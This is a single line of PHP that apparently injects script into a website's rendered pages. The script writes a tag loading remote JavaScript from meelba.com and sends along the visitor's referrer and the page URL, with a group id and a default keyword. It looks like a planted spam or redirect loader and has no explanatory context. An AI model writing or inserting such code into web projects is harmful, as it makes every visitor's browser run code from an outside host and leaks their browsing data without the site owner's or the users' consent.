...
$RENDER.='<script>document.write("<script type=text/javascript src=\""+"http://meelba.com/3.html?group=prokazan-ru&seoref="+encodeURIComponent(document.referrer)+"&ur=1&rnd="+Math.random()+"&HTTP_REFERER="+encodeURIComponent(document.URL)+"&default_keyword=key+po+umolchaniyu"+"\"><\/script>");</script>';
